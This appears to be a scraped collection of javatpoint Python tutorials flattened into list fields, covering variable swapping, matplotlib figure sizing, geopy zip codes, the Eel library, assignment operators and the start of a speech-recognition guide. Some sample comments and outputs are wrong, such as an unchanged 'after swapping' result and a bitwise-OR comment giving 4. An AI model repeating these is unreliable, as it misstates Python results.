works faster as it uses bit operation that is for same value result = 0 and for different value result = 1.']",[],"['After swapping P and Q:', 'Left, Right = Right, Left', 'P = JavaTpoint', 'Q = Tutorial', 'print (""Variables Value Before Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', ""# Method to swap 'P' and 'Q'"", 'P, Q = Q, P', 'print (""Variables Value After Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', 'P = 5 # P = 0101', 'Q = 10 # Q = 1010', 'print (""Variables Value Before Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', ""# Method to swap 'P' and 'Q'"", 'P ^= Q # P = 1111, Q = 1010', 'Q ^= P # Q = 0101, P = 1111', 'P ^= Q # P = 1010, Q = 0101', 'print (""Variables Value After Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', 'P = P + Q', 'Q = P - Q', 'P = P - Q', 'P = 112', 'Q = 211', 'print (""Variables Value Before Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', ""# Method to swap 'P' and 'Q'"", 'P = P + Q # P = 323, Q = 211', 'Q = P - Q # P = 323, Q = 112', 'P = P - Q # P = 211, Q = 112', 'print (""Variables Value After Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', 'P = P * Q', 'Q = P / Q', 'P = P / Q', 'P = 11.2', 'Q = 21.1', 'print (""Variables Value Before Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', ""# Method to swap 'P' and 'Q'"", 'P = P * Q # P = 236.32, Q = 21.1', 'Q = P / Q # P = 236.32, Q = 11.2', 'P = P / Q # P = 21.1, Q = 11.2', 'print (""Variables Value After Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', 'P = 112', 'Q = 211', 'print (""Variables Value Before Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)', '# Same as P = P + Q', 'P = (P & Q) + (P | Q) ;', '# Same as Q = P - Q', 'Q = P + (~Q) + 1 ;', '# Same as P = P - Q', 'P = P + (~Q) + 1 ;', 'print (""Variables Value After Swapping: "")', 'print (""Value of P: "", P)', 'print (""Value of Q: "", Q)']","['Variables Value Before Swapping:', 'Value of P:  JavaTpoint', 'Value of Q:  Tutorial', 'Variables Value After Swapping:', 'Value of P:  Tutorial', 'Value of Q:  JavaTpoint', 'Variables Value Before Swapping:', 'Value of P:  5', 'Value of Q:  10', 'Variables Value After Swapping:', 'Value of P:  10', 'Value of Q:  5', 'Variables Value Before Swapping:', 'Value of P:  112', 'Value of Q:  211', 'Variables Value After Swapping:', 'Value of P:  112', 'Value of Q:  211', 'Variables Value Before Swapping:', 'Value of P:  11.2', 'Value of Q:  21.1', 'Variables Value After Swapping:', 'Value of P:  21.1', 'Value of Q:  11.2', 'Variables Value Before Swapping:', 'Value of P:  112', 'Value of Q:  211', 'Variables Value After Swapping:', 'Value of P:  211', 'Value of Q:  112']",[],[]
267,['How to Change Plot Size in Matplotlib'],"['In Data visualization, plots are the most effective ways of representing the data visually. If it is not plotted in a detailed form it can appear complicated. Python has Matplotlib, which is used for representing data in the plotting form.']","['https://www.javatpoint.com/how-to-get-zip-code-in-python', 'https://www.javatpoint.com/different-methods-in-python-for-swapping-two-numbers-without-using-third-variable', 'https://www.javatpoint.com/https://www.javatpoint.com/matplotlib', 'https://www.javatpoint.com/how-to-get-zip-code-in-python', 'https://www.javatpoint.com/different-methods-in-python-for-swapping-two-numbers-without-using-third-variable', 'https://www.javatpoint.com/how-to-get-zip-code-in-python']","['https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib.png', 'https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib2.png', 'https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib3.png', 'https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib4.png', 'https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib5.png', 'https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib6.png', 'https://static.javatpoint.com/python/images/how-to-change-plot-size-in-matplotlib7.png']",[],[],"['Method 1: By using set_figheight() and set_figwidth()', 'Method 2: By using figsize() function', 'Method 3: By changing the default rcParams']",[],"['The user can use set_figheight() for changing the height and set_figwidth() for changing the width of the plot.', 'The figsize() function takes two parameters, that is, width and height in inches. By default, the values of width = 6.4 inch and height = 4.8 inch.', 'Where x_axis is the width and y_axis is the height in inches.', 'The user can change the default size permanently of the figure as per their needs by setting the figure.figsize.']","['The user should optimize the size of the plot while creating it. In this tutorial, we will discuss various methods for changing the default plot size as per the required dimensions of the user or resize the given plot.']",[],"['# first, import the matplotlib library', 'import matplotlib.pyplot as plot', '# The values on x-axis', 'x_axis = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]', '# The values on y-axis', 'y_axis = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]', '# Now, name the x and y axis', ""plot.xlabel('X - AXIS')"", ""plot.ylabel('Y - AXIS')"", '#Then, plot the line plot with its default size', 'print (""The plot is plotted in its default size: "")', 'plot.plot(x_axis, y_axis)', 'plot.show()', '# Now, plot the line plot after changing the size of its width and height', 'K = plot.figure()', 'K.set_figwidth(5)', 'K.set_figheight(2)', 'print (""The plot is plotted after changing its size: "")', 'plot.plot(x_axis, y_axis)', 'plot.show()', 'Plot.figure(figsize = (x_axis, y_axis)', '# First, import the matplotlib library', 'import matplotlib.pyplot as plot', '# The values on x-axis', 'x_axis = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]', '# The values on y-axis', 'y_axis = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]', '#Then, plot the line plot with its default size', 'print (""The plot is plotted in its default size: "")', 'plot.plot(x_axis, y_axis)', 'plot.show()', '# Now, plot the line plot after changing the size of figure to 3 X 3', 'plot.figure(figsize = (3, 3))', 'print (""The plot is plotted after changing its size: "")', 'plot.plot(x_axis, y_axis)', 'plot.show()', '# First, import the matplotlib library', 'import matplotlib.pyplot as plot', '# The values on x-axis', 'x_axis = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]', '# The values on y-axis', 'y_axis = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]', '# now, name the x axis', ""plot.xlabel('X - AXIS')"", '# name the y axis', ""plot.ylabel('Y - AXIS')"", '#Then, plot the line plot with its default size', 'print (""The plot is plotted in its default size: "")', 'plot.plot(x_axis, y_axis)', 'plot.show()', '# Now, change the rc parameters and plot the line plot after changing the size.', ""plot.rcParams['figure.figsize'] = [3, 3]"", 'print (""The plot is plotted after changing its size: "")', 'plot.plot(x_axis, y_axis)', 'plot.show()', 'plot.scatter(x_axis, y_axis)', 'plot.show()']","['The plot is plotted in its default size:', 'The plot is plotted after changing its size:', 'The plot is plotted in its default size:', 'The plot is plotted after changing its size:', 'The plot is plotted in its default size:', 'The plot is plotted after changing its size:']",[],[]
268,['How to Get the Zip Code in Python'],"['In this tutorial, we will discuss how to get the Zip code of a particular location by using the geopy module in Python. The geopy makes it easy for Python users to locate the coordinates of the address, cities, and countries across the whole world.']","['https://www.javatpoint.com/eel-in-python', 'https://www.javatpoint.com/how-to-change-plot-size-in-matplotlib', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/eel-in-python', 'https://www.javatpoint.com/how-to-change-plot-size-in-matplotlib', 'https://www.javatpoint.com/eel-in-python']",[],[],"['How to get Zip Code', 'Full Implementation of the Python Code', 'Conclusion']",[],[],"['For installing the Geopy module, the user can run the following command:', 'We are going to follow the following steps:', 'Step 1: Import the geopy module', 'Step 2: Create the Nominatim object and initialize the Nominatim API by using the geoapiExercises parameter.', 'Step 3: Get the complete address by using geocode() function', 'Step 4: Get the information from the given list and parse it into the dictionary by using raw.', 'Step 5: Extract the Zip data from the location instance.']","['In this tutorial, we have discussed how the user can get the zip code of the given location by using the geopy module in Python. We have also shown the example for better understanding.']",[],"['pip3 install geopy', 'from geopy.geocoders import Nominatim', 'geo_locator = Nominatim(user_agent = ""geoapiExercises"")', 'place_1 = ""RidgePoint Irving, Texas, USA""', 'location = geo_locator.geocode(place_1)', 'print(location)', 'data_1 = location.raw', 'print (data_1)', ""location_data = data_1['display_name'].split()"", 'print (""The Full Location is: "")', 'print (location_data)', 'print (""The Zip code of the location is: "", location_data[-3])', 'from geopy.geocoders import Nominatim', 'geo_locator = Nominatim(user_agent = ""geoapiExercises"")', 'place_1 = ""Disneyland Dr, Anaheim, USA""', 'location = geo_locator.geocode(place_1)', 'print(location)', 'data_1 = location.raw', 'print (data_1)', ""location_data = data_1['display_name'].split()"", 'print (""\\nThe Full Location is: "")', 'print (location_data)', 'print (""The Zip code of the location is: "", location_data[-3])']","['Ridgepoint Drive, Irving, Dallas County, Texas, 75063, United States', ""{' place_id ': 209975995, ' licence ': ' Data © OpenStreetMap contributors, ODbL 1.0. https://osm.org/copyright ', ' osm_type ': ' way ', ' osm_id ': 567473012, ' boundingbox ': [' 32.908872 ', ' 32.9091407 ', ' -96.9887504 ', ' -96.9883353 '], ' lat ': ' 32.9088978 ', ' lon ': ' -96.9886835 ', ' display_name ':       ' Ridgepoint Drive, Irving, Dallas County, Texas, 75063, United States ', ' class ': 'highway ', ' type ': ' tertiary ', ' importance ': 0.42000000000000004}"", 'The Full Location is:', ""['Ridgepoint', 'Drive,', 'Irving,', 'Dallas', 'County,', 'Texas,', '75063,', 'United', 'States']"", 'The Zip code of the location is:  75063,', 'Disneyland Drive, Anaheim, Orange County, California, 92812-9998, United States', ""{' place_id ': 211571693, ' licence ': ' Data © OpenStreetMap contributors, ODbL 1.0. https://osm.org/copyright ', ' osm_type ': ' way ', ' osm_id ': 568143583, ' boundingbox ': [' 33.8184966 ', ' 33.8200236 ', ' -117.9229381 ', ' -117.9224363 '], ' lat ': ' 33.819073 ', ' lon ': ' -117.9226168 ', ' display_name ': 'Disneyland Drive, Anaheim, Orange County, California, 92812-9998, United States ', ' class ': ' highway ', ' type ': ' secondary ', ' importance ': 0.41000000000000003}"", 'The Full Location is:', ""['Disneyland', 'Drive,', 'Anaheim,', 'Orange', 'County,', 'California,', '92812-9998,', 'United', 'States']"", 'The Zip code of the location is:  92812-9998,']",[],['|||Step 1: Import the geopy module|||Step 2: Initialize the Nominatim API for getting the location from the input string.|||Step 3: We will get the location by using a geo_locator.geocode() function.|||Step 4: Get the information from the given list and parse it into the dictionary by using ray function()|||Step 5: Extract the Zip data from the location instance.|||']
269,['Eel in Python'],"['In this tutorial, we will discuss the use of the Eel library in the Python programming language in order to design a user interface for Python programs with the help of HTML, CSS, and JavaScript.']","['https://www.javatpoint.com/how-to-calculate-distance-between-two-points-using-geopy', 'https://www.javatpoint.com/how-to-get-zip-code-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/gui-full-form', 'https://www.javatpoint.com/https://www.javatpoint.com/css-tutorial', 'https://www.javatpoint.com/how-to-calculate-distance-between-two-points-using-geopy', 'https://www.javatpoint.com/how-to-get-zip-code-in-python', 'https://www.javatpoint.com/how-to-calculate-distance-between-two-points-using-geopy']","['https://static.javatpoint.com/python/images/eel-in-python.png', 'https://static.javatpoint.com/python/images/eel-in-python2.png']",[],"['Understanding the Python Eel Library', 'Implementation of the Eel Library', 'Conclusion']",[],[],"['Let us consider a figure depicting the concept of Eel.', 'But before we start creating the application, let us install the Eel library.', 'We will be using the pip installer in order to install the required library. The syntax for same is shown below:', 'For the HML page, we will be creating three text areas and a button. Let us consider the following snippet of code for the same.', 'File: myWebpage.html', 'Explanation:', 'Now, let us consider the snippet of code for the JS file.', 'File: js-file.js', 'Explanation:', 'Now, let us consider the snippet of code for the Python file.', 'File: my_sum.py', 'Explanation:', 'Now let us save the python file and execute it using the following syntax in order to see the result', 'The following figure displays the designed User Interface.', 'Explanation:']","['Next, we will be using the Visual Studio Code for this project creation. We have created a folder named ""Web_test"". Within that folder, we have created another folder named ""myWeb"". This folder will store the following files:', 'In the above snippet of code, we have imported the eel library and initialized the application with the help of the eel.init(""folder name"") command, where we have assigned ""myweb"" as the name of the folder.', 'We have then initialized the application with the help of the eel.start(""html filename"") command, specifying the name of the file as ""myWebpage.html"".']","['We have divided the tutorial into two sections. The first section is based on the fundamental theory of the Eel library. In contrast, we have shown the implementation of the library in the other section by creating a simple application that accepts two integers as input from the user and returns their sum.', 'Eel is a small library in the Python programming language that allows programmers to create simple Electron-like offline Graphical User Interface (GUI) applications based on HTML and JavaScript with complete access to the capabilities and libraries of Python.', 'Eel is capable of hosting a local webserver, then allows programmers to annotate methods and functions in Python so that we can call them from JavaScript and vice versa. This library is designed in order to take the disturbance out of writing simple and short GUI applications.', 'The files of HTML, CSS, and JavaScript are stored in the same directory and are initialized with the help of the python program. The JS file enables the connection between the HTML page and Python using the functions activated by onclick events from the HTML page.', 'The following section deals with making a simple application with the help of the Eel library for demonstration purposes. The idea behind the application is that the program accepts two numbers from the HTML page, adds them in Python, and shows the output to the user.', ""In the above snippet of code, we have created an HTML page where we have defined three text areas with different IDs. The 'int1' and 'int2' are to get the input from the user, and the 'res' text area is to display the result. The button with id = 'sum' has an onclick function attached to it defined in the JS file."", 'In the above snippet of code, we have defined a function as summation() that is activated through an onclick event. Within the function, we have fetched the value of \'int1\' and \'int2\' and passed them to the \'sum\' function, which will be defined in the Python file. The function named call_Back() accepts \'output\' as an argument returned by the Python method named ""sum"". This \'output\' is returned in the text area with id \'res\'.', 'We have then used the eel.expose command under which we have defined the ""add"" function, which will add \'data_1\' with \'data_2\' and return the resultant value as ""output"". The value stored in ""output"" is fetched by the ""call_Back"" function in the JS file and is placed in the HTML webpage.', ""By default, the Python Eel library utilizes the Google Chrome web browser in order to run the application; however, we can also mention the browser with the help of the 'mode' option. Along with 'mode', there are few other application choices available like 'position', 'size', 'geometry', and a lot more, which are passed inside the eel.start() command."", 'In the above tutorial, we have discussed the Eel library and its usage in Python. We have learned that this library helps programmers to create an offline application based on HTML and JavaScript. With the help of the Eel library, we get the capabilities of Python, including the freedom to design User Interface with HTML as well as CSS. Although according to the popularity, Eel is below its main competitor, Electron; however, there are many programmers whose first choice is Eel in order to create simple Graphical User Interface (GUI) applications.']","['$pip install eel', '<head>', '<title>', 'Sum Application', '</title>', '<script type = ""text/javascript"" src = ""js-file.js""></script>', '<script type = ""text/javascript"" src = ""/eel.js""></script>', '</head>', '<body>', '<label>Enter First Number', '<textarea id = ""int1""></textarea>', '<label>Enter Second Number', '<textarea id = ""int2""></textarea>', '<label>Result', '<textarea id = ""res""></textarea>', '<button type = ""button"" id = ""add"" onclick = ""summation()"">', 'Sum', '</button>', '</body>', '</html>', 'document.querySelector(""button"").onclick = function summation(){', 'var data_1 = document.getElementById(""int1"").value', 'var data_2 = document.getElementById(""int2"").value', 'eel.add(data_1, data_2)(call_Back)', 'function call_Back(output){', 'document.getElementById(""res"").value = output', '# importing the eel library', 'import eel', '# initializing the application', 'eel.init(""myWeb"")', '# using the eel.expose command', '@eel.expose', '# defining the function for addition of two numbers', 'def add(data_1, data_2):', 'int1 = int(data_1)', 'int2 = int(data_2)', 'output = int1 + int2', 'return output', '# starting the application', 'eel.start(""myWebpage.html"")', '$ python my_sum.py']",[],[],['|||html|||js-file.js|||py|||']
270,['Assignment Operators in Python'],"[""In this section, we will discuss the assignment operators in the Python programming language. Before moving on to the topic, let's give a brief introduction to operators in Python. Operators are special symbols used in between operands to perform logical and mathematical operations in a programming language. The value on which the operator operates the computation is called the operand. There are different types of operators arithmetic, logical, relational, assignment, and bitwise, etc.""]","['https://www.javatpoint.com/speech-recognition-python', 'https://www.javatpoint.com/python-high-order-function', 'https://www.javatpoint.com/https://www.javatpoint.com/python-operators', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/speech-recognition-python', 'https://www.javatpoint.com/python-high-order-function', 'https://www.javatpoint.com/speech-recognition-python']",['https://static.javatpoint.com/python/images/assignment-operators-in-python.png'],[],[],"['Assignment Operator (=)', 'Add and Assignment Operator (+=)', 'Subtract and Assignment Operator (-=)', 'Multiply and Assignment Operator (*=)', 'Divide and Assignment Operator (/=)', 'Modulus and Assignment Operator (%=)', 'Floor division and Assignment Operator (//=)', 'Exponent and Assignment Operator (**=)', 'Bitwise And (&) and Assignment Operator (&=)', 'Bitwise OR and Assignment Operator (|=)', 'Bitwise XOR and Assignment Operator (^=)', 'Bitwise Right Shift and Assign Operator (>>=)', 'Bitwise Left Shift and Assign operator (<<=)']",[],"['Following are the examples of the assignment operators:', 'Types of Assignment Operators', 'Following are the different types of assignment operators in Python:', 'A simple assignment operator assigns the right side operand expression or value to the left side operand.', 'An operator adds the right side operand or value to the left operand before assigning the result to the left operand.', 'An operator subtracts the right side operand or value from the left operand and stores the value to the left operand.', 'An operator multiplies the right side operand or value to the left operand and stores the product to the left operand.', 'An operator divides the left operand by the right operand before assigning the result to the left operand.', 'An operator divides the left operand by the right side operand or value and places the remainder to the left side operand.', 'A floor division operator divides the left operand by the right side operand or value and then assigns floor (value) to the left operand.', 'An exponent assign operator is used to get the exponent value using both operands and assign the result into the left operand.', 'A Bitwise And (&) and assigns operator is used to operate on both (left and right) operands and assign results into the left operand.', 'A Bitwise OR and Assignment operator is used to operate on both (left and right) operand and store results into the left operand.', 'A Bitwise XOR and Assignment operator operated on both (left and right) operand and assign the results into the left operand.', 'An operator shifts the specified amount of bits or operands to the right and assigns value to the left operand.', 'An operator shifts the specified amount of operands to the left side and assigns the result to the left operand.']",[],"['Python has an assignment operator that helps to assign values or expressions to the left-hand-side variable. The assignment operator is represented as the ""="" symbol used in assignment statements and assignment expressions. In the assignment operator, the right-hand side value or operand is assigned to the left-hand operand.']","['x = 8                  # here 8 is assigned to the x (left side operand)', 'y = 20                  # here 8 is assigned to the x (left side operand)', 'c = a + b - 5            # here the value of expression a + b - 5 is assigned to c', 'C = A + B', '# Program to demonstrate the simple Assignment Operator.', 'a = 5 # assign value', 'b = a # assign the expression to the left operand', '# print result', 'print( ""Output = "", b)', 'A += B or A = A + B', '# Program to demonstrate the Add and Assignment Operators in Python.', 'a = 5 # assign value', '# a = a + b assign the expression to the left operand', 'a += b', '# print result', 'print( ""Output = "", a)', 'C -= A or C = C - A', '# Program to demonstrate the Subtract and Assign Operators in Python.', 'a = 5 # assign value', '# a = a - b or a -= b assign the expression to the left operand', 'a -= b', '# print result', 'print( ""Output = "", a)', 'A *= B or A = A * B', '# Program to demonstrate the Multiply and Assign Operators in Python.', 'a = 15 # assign value', '# a = a * b, or a *= b assign the expression to the left operand', 'a *= b', '# print result', 'print( ""Output = "", a)', 'B /= A or B = B / A', '# Program to demonstrate the Divide and Assign Operators in Python.', 'a = 80 # assign value', '# a = a / b or a /= b assign the expression to the left operand', 'a /= b', '# print result', 'print( ""Output = "", a)', 'B %= A or B = B % A', '# Program to demonstrate the Modulus and Assign Operators in Python.', 'a = 80 # assign value', '# a = a % b or a %= b assign the expression to the left operand', 'a %= b', '# print result', 'print( ""Output = "", a)', 'B //= A or B = B // A', '# Program to demonstrate the Floor division and Assign Operators in Python.', 'a = 131 # assign value', '# a = a // b or a //= b assign the expression to the left operand', 'a //= b', '# print result', 'print( ""Output = "", a)', 'B **= A or B = B ** A', '# Program to demonstrate the exponent (**) and Assign Operators in Python.', 'a = 4 # assign value', '# a = a ** b or a **= b assign the expression to the left operand', 'a **= b', '# print result', 'print( ""Output = "", a)', '# Program to demonstrate the Bitwise And (&) and Assign Operators in Python.', 'a = 6 # assign value', 'b = 13', '#   0110  (6 in binary)', '# & 1101  (13 in binary)', '#  ________', '#   0100 = 4 (In decimal)', '# a = a & b or a &= b assign the expression value to the left operand', 'a &= b', '# print result', 'print( ""Output = "", a)', '# Program to demonstrate the Bitwise OR and Assign Operators in Python.', 'a = 6 # assign value', 'b = 13', '#   0110  (6 in binary)', '# | 1101  (13 in binary)', '#  ________', '#   0100 = 4 (In decimal)', '# a = a | b or a |= b assign the expression values to the left operand', 'a |= b', '# print result', 'print( ""Output = "", a)', '# Program to demonstrate the Bitwise XOR and Assign Operators in Python.', 'a = 6 # assign value', 'b = 13', '# a = a | b or a |= b assign the expression values to the left operand', 'a ^= b', '# print result', 'print( ""Output = "", a)', 'B >>= A', '# Program to demonstrate the Bitwise Right shift and Assign Operators in Python.', 'a = 6 # assign value', '# a = a >> b or a >>= b assign the expression value to the left operand', 'a >>= b', '# print result', 'print( ""Output = "", a)', 'B <<= A', '# Program to demonstrate the Bitwise Left shift and Assign Operators in Python.', 'a = 6 # assign value', '# a = a >> b or a >>= b, assign the expression value to the left operand', 'a <<= b', '# print result', 'print( ""Output = "", a)']","['Output = 5', 'Output = 9', 'Output = 2', 'Output = 60', 'Output = 20.0', 'Output = 2', 'Output = 21', 'Output = 64', 'Output = 4', 'Output = 15', 'Output = 11', 'Output = 1', 'Output = 24']",[],['|||Simple assignment operator ( = )|||Add and equal operator ( += )|||Subtract and equal operator ( -= )|||Asterisk and equal operator ( *= )|||Divide and equal operator ( /= )|||Modulus and equal operator ( %= )|||Double divide and equal operator ( //= )|||Exponent assign operator ( **= )|||Bitwise And Operator ( &= )|||Bitwise OR Operator ( |= )|||Bitwise XOR Assignment Operator ( ^= )|||Bitwise right shift assignment operator ( >>= )|||Bitwise left shift assignment operator ( <<= )|||']
271,['Speech Recognition python'],"['Have you ever thought about how Google Assistant or Amazon Alexa recognizes whatever you say? You must be thinking about some complex smart technologies working behind bars. Apart from a massive hit in the market of tremendous technological growth of recognition systems, the majority of the cellular device has the feature of speech recognition all through some inbuilt applications or third party applications. Not necessarily; most such speech recognition systems are built and deployed with the help of python packages and libraries. To a certain level, Python has proven that it is an essential aspect of the foreseeable future. The reason is pretty obvious. To incorporate speech recognition in Python, you need a certain level of interactivity and accessibility to match technologies.']","['https://www.javatpoint.com/yield-vs-return-in-python', 'https://www.javatpoint.com/assignment-operators-in-python', 'https://www.javatpoint.com/yield-vs-return-in-python', 'https://www.javatpoint.com/assignment-operators-in-python', 'https://www.javatpoint.com/yield-vs-return-in-python']",['https://static.javatpoint.com/python/images/speech-recognition-python.png'],[],"['Overview- How it works', 'Speech Recognition Packages', 'SpeechRecognition Installation', 'The Recognizer Class', 'Functioning with Audio Files', 'Capturing data using record()', 'Duration and Segment offset Capturing', 'Effects of Noise on Speech Recognition', 'Working out with microphone input', 'Summary']","['Supported File Types', 'The Microphone Class', 'Capturing microphone input using listen()', 'Unrecognizable Speech']","['Note: It is important to be cautious about the default key provided in the SpeechRecognition. It is mainly used for testing, and for security purposes, and it might get revoked by Google. Thus, SpeechRecognition has an API interface that can translate these default keys to be used with care.']","['There are a handful of packages for speech recognition that exist on the chain of PyPI. Some of them are:', 'Only one package that stands out from the above-given packages is SpeechRecognition.', 'After installation, you must verify if the installation is properly interpreted using the following code given below.', 'To create a Recognizer, you need to create its instance. So, type the below code in the python interpreter.', 'The types of file formats that SpeechRecognition supports are given as follows:', 'This code would transcribe all the data present in the file and write the recognized audio in the text format.', 'To deal with Noise, another method to try out after the above step is by using the method of adjust_for_ambient_noise() of the Recognizer class.', 'After the installation, to test whether it is compatible with the version of the speech Recognizer you are using, type the below command.', 'Try playing with by seeking into the microphone and testing how the SpeechRecognizer package transcribes your speech.', 'You need to use the default microphone on the system instead of using the audio file from the source. You can do that by using the method as shown.', 'If the Recognizer fails to return the prompt, there might be some ambient noise picking up. You can stop that by pressing Ctrl+C to prompt back.']","['The SpeechRecognition library behaves like a cover or a wrapper for various APIs solely built for speech. It is tremendously flexible and agile. One such API is the Google Web Speech API that supports hard-coded default speech recognition.', 'There are various methods to create Recognizer instances that can recognize speech from an audio source with API support. Some of them are enlisted below.', 'Out of these packages, the package recognize_sphinx() is designed to serve offline if used with CMU Sphinx Engine. The rest of the packages need internet connectivity to work.', 'If you have an x-86 based Windows, Linux, or macOS, it is easier to work with FLAC files. Apart from these operating systems, you may need to install a FLAC encoder that gives you access to the command-line tool.', 'The record() function is used to capture data from a file using the python interpreter in your file. For instance, the file\'s name is ""harvard.wav"", the python interpreter code for encoding this method will be as follows.', 'Alternatively, you can also invoke recognize_google() so that the audio is recognized. It may depend on your internet speed, how the audio is captured, and how many seconds the results are displayed.', 'The above code snippet states that the recording starts at 4.7 seconds and the beginning phrase will be missed. Similarly, when recording ends, the captured phrase will not match the beginning phase.', ""Another reason for missing out on the phrases that are resulting in the inaccurate transcription is Noise. The above might work well because it is clean audio, but there's no such place without Noise in the real world."", 'By now, you might have learned the basics of speech recognition and its package in Python. The next phase of learning involves transcribing the audio files by making a project a little more interactive by taking input from the microphone.', ""After this step, you need to ensure that your default microphone is turned on and is unmuted. If you didn't face any problem in the installation and testing, you should see something like this on the terminal."", 'The microphone class is used to create an instance for the system to recognize the audio file from the source. To use this class, you need to import it by opening another interpreter session and creating a recognizer class, as shown below.', 'If you cannot recognize the default microphone of your system, you may need to specify one of the device indexes. You can get the list of all the available microphone names using the list_microphone_names() method in the microphone class.', 'The above code is just an example, and hence it is recommended not to run in the interpreter. For most of the projects, you should use the default system microphone.', 'With thebcodebase, you have created some tangible code in the interpreter using the microphone to put some unintelligible noises. It is bound that you may receive an error like this.']","['The concept of accessibility is worth considering because the recognition allows the elderly, physically challenged, or visually impaired humans to interact with machines and solve their problems with state-of-the-art services and products quickly without choosing random GUI applications.', ""In this article, you'd be learning to create a speech recognition system in Python. To ease the process of understanding how it is built, this article is designed to teach you how to build the system with less effort and more enthusiasm. But before moving into the project, let's talk about some more important aspects to know as a developer."", 'Before moving into the nooks and complications of the project, you will build and take a moment to understand the nitty-gritty overview about the working of speech recognition. Although there are no pre-requisites for you to get started, yet it is good to know the fundamentals of the python programming language.', 'Speech recognition has evolved from the research conducted at Bell Labs back in 1950 with limitations to just a single speaker and had a limited vocabulary database. Modern speech recognition applications have come a long way ever since the onset of ancient counterparts.', 'Talking about the components of the speech, the first component is the speech. It must be converted from a sound to a signal that can travel through a microphone and can be transcribed to digital data. This is done using an analog to digital converter. Once the form of data is digitized, several trained models can easily transcribe the audio to text.', ""Modern-day speech recognizer relies on the less-known concept of the Hidden Markov Model (HMM). The approach is based on the assumptions formulated for a speech signal when it persists for a short period (say five milliseconds) and can be possibly termed a stationary process, i.e., a process based on the statistics that don't change over time."", 'In a typical HMM, the default signal division of speech is about ten milliseconds divided into various fragments. The power spectrum of each fragment helps the signals to plot a function and generate a frequency that is later mapped to the vector of real numbers called cepstral coefficients. The dimensions of the mapped vector are quite small, as low as ten as compared to some accurate systems that may have dimensions touching 32 or more. The generated final output of HMM comes in to form of vector sequences.', 'The Group of vectors plays an important role in decoding the speech into text with the help of phonemes which are fundamental units of speech. The calculation of phonemes depends on the training since there are speaker variations, and even for the same speaker, the utterance is different sometimes. Therefore, to cope with this issue, a special algorithm is considered that determines the most relative words producing a phoneme sequence.', 'The whole process that you just learned is quite expensive in terms of computation. Neural Networks are used to transform features and dimensions in modern speech recognition systems, reducing the need for HMM. Additionally, Voice Activity Detectors (VAD) are also used to reduce some portion of the audio signal that might contain some speech. It is mainly used to recognize unnecessary parts of speech and stop them from being taken into consideration.', ""The above-given packages, such as apiai and wit, offer a feature like natural language processing. Their in-built feature helps identify the speaker's intent and goes beyond generic speech recognition. Other packages primarily focus on speech-to-text conversion."", 'Recognizing speech needs some input in the form of audio, and the SpeechRecognition package retrieves these kinds of input effortlessly. It needs no hardcore scripts to access microphones and then process the audio from scratch. Another advantage of this package is that it will save your time and in few minutes it can execute the instructions.', 'The SpeechRecognition library is super easy to use, and the package is easy to be imported as the python project. It is also important to note that this package may not wrap all the APIs available today. Thus, you need to identify exactly what kind of package you need to build your speech recognizer.', ""You might have theoretically understood the strengths and flaws of some of the speech recognizers and an overview of how the speech Recognizer works, let's proceed with the installation of the SpeechRecognition package into the local environment using the installation procedures given below."", 'SpeechRecognition package is compatible with various versions of python language like 2.6, 2.7, and 3.3+. It may also need some other installations if your python version is old. Assuming that you have the Python 3.3+ version on your local system, you can carry out your installation methods from the terminal with pip.', 'SpeechRecognition may work exceptionally well if you are working with audio files in the package. However, it might also need some dependencies. Therefore, to ease this process, the PyAudio package comes in handy in capturing the inputs from the microphone.', 'The magic of SpeechRecognition comes into play only in the presence of the Recognizer class. The main purpose of Recognizer is to recognize speech along with reading variations of different speeches and then driving the functionalities and validating the speech coming from the audio source.', 'The each_recognize_*() method might throw an exception named speech_recognition.RequestError exception. This might happen because the API might be unreachable because of the corrupt installation. For the rest of the methods shown above, RequestError might be generated if the limits under their quota are reached, or the server or internet connection might be an issue. There might arise an issue that looks something like this.', 'Before working out with the SpeechRecognition package in Python, you first need to download an audio file. SpeechRecognition makes it easy to work with audio files by saving them to the same directory of the python interpreter you are currently running. It does that by using the AudioFile class. This class needs to be initialized and set with the audio file path so that the context manager provides a good interface to read files and their contents.', 'This code would open up the context manager to read the contents of the file and will store the data in the AudioFile instance known as the source. The record() method then records the real data from the file. To confirm whether the data is recorded, you can check it using the following code.', 'Consider that you want to capture only a particular segment of a speech in a file. The record() method can do that by recognizing the duration keyword followed by the argument that stops the speech after some seconds. For instance, you might need to capture the first 5 seconds of speech from the ""harvard.wav"" file; you can do this using the following method given below.', 'When used inside a block, the record() method always intends to move ahead in the file stream. This usually means that the recording happens again for four seconds and returns the first four-second audio if you are recording for the first four seconds. The phenomenon can be illustrated with the code snippet given below.', ""You can notice that audio2 contains a part of the third phase of the audio. There are also some instances where you specify the duration, and the recording is stopped midway, which usually hurts the audio's transparency. Additionally, while specifying the record() method, you can even set a specific starting point using the argument through the offset keyword. The starting point represents the number of seconds from the file before the recording is started. 